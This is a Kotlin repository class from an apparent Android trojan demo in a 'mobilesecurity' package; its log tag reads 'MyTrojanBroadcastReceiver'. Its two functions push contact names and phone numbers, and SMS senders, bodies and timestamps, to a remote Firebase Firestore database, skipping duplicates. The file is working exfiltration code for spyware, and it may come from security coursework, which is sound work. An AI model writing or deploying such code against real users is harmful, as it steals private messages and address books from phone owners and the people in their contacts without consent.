package com.example.mobilesecurity.model

import android.util.Log
import com.google.firebase.Firebase
import com.google.firebase.firestore.firestore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class ContactRepository {
    val db = Firebase.firestore
    val TAG = "MyTrojanBroadcastReceiver"

    suspend fun addContactSequentially(contact: Contact) {
        withContext(Dispatchers.IO) {
            // Check if the contact already exists
            db.collection("contacts")
                .whereEqualTo("phone", contact.phone)
                .get()
                .addOnSuccessListener { querySnapshot ->
                    if (querySnapshot.isEmpty) {
                        // If the contact doesn't exist, add it
                        val newContact = hashMapOf(
                            "name" to contact.name,
                            "phone" to contact.phone
                        )
                        db.collection("contacts")
                            .add(newContact)
                            .addOnSuccessListener { documentReference ->
                                Log.d(TAG, "Contact added with ID: ${documentReference.id}")
                            }
                            .addOnFailureListener { e ->
                                Log.e(TAG, "Error adding contact: $e")
                            }
                    } else {
                        Log.i(TAG, "Contact with phone number ${contact.phone} already exists.")
                    }
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "Error checking for existing contact: $e")
                }
        }
    }



    //addSMSMessageSequentially - check if the message exist first, then add it
    suspend fun addSMSMessageSequentially(smsMessage: SMSMessage) {
        withContext(Dispatchers.IO) {
            // Check if the message already exists
            db.collection("smsMessages")
                .whereEqualTo("address", smsMessage.address)
                .whereEqualTo("body", smsMessage.body)
                .whereEqualTo("timestamp", smsMessage.timestamp)
                .get()
                .addOnSuccessListener { querySnapshot ->
                    if (querySnapshot.isEmpty) {
                        // If the message doesn't exist, add it
                        val newSMSMessage = hashMapOf(
                            "address" to smsMessage.address,
                            "body" to smsMessage.body,
                            "timestamp" to smsMessage.timestamp
                        )
                        db.collection("smsMessages")
                            .add(newSMSMessage)
                            .addOnSuccessListener { documentReference ->
                                Log.d(TAG, "SMS message added with ID: ${documentReference.id}")
                            }
                            .addOnFailureListener { e ->
                                Log.e(TAG, "Error adding SMS message: $e")
                            }
                    } else {
                        Log.i(TAG, "SMS message already exists.")
                    }
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "Error checking for existing SMS message: $e")
                }
        }
    }
}